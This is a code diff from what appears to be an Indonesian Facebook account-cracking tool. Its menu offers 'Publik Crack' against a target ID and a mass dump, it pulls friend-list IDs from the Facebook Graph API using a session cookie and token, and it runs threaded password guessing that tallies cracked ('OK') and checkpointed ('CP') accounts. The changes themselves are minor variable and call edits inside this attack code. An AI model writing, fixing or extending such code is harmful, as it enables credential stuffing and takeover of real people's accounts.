@@ -413,11 +413,11 @@ def login_menu():
              {H2}╰─▶ {B2}03 [bold purple]Clone ID Email  {H2}╰─▶ {B2}00 [bold purple]Exit Program""")
     ___Sllowly_ID____ = input(f'✶ ━━⫸ {H} Input{N} : ')
     if ___Sllowly_ID____ in ['1']:
-        Dump_Massal()
+        massal2()
     elif ___Sllowly_ID____ in ['2']:
         print(nel(f'\t\t [bold blue]Publik Crack',width=90, padding=(0, 8), style=f"bold purple"))
         idt = input(f'\n✶ ━━⫸ {H2} Masukkan ID Target  : {m}')
-        dump1(idt,"",{"cookie":cok},token)
+        dump1(idt,"",{"cookie":cookie},token)
         setting()
     elif ___Sllowly_ID____ in ['3']:
 	    mail2()
@@ -672,7 +672,7 @@ def massal2():
                 "https://graph.facebook.com/{}".format(user),
                 params=params,
                 headers=head,
-                cookies={"cookie": cok},
+                cookies={"cookie": cookie},
             ).json()
             for xr in url["friends"]["data"]:
                 try:
@@ -1045,12 +1045,12 @@ def passwrd():
 				pool.submit(_messenger_,uid,pwv)
 			else:
 				pool.submit(_validate_,uid,pwv)
+				
 	print('')
 	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
 	print(f'[•]{K2} CP : {K2}%s '%(cp))
 	input(f'[{x} Klik "{m}Enter{x}" Untuk Kembali Kemenu{x}]')
-	clear()
 	pepek()
 #--------------------[ METODE VALIDATE ]-----------------#
 def validate1(idf,pwv):
